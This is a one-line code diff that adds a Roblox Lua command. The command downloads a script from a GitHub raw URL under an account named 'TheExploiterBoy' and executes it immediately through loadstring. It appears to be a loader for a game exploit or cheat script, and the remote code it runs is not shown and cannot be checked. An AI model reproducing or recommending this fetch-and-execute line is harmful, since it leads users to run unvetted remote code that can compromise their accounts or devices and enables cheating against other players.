@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheExploiterBoy/New-Script/main/who_is_spy"))()
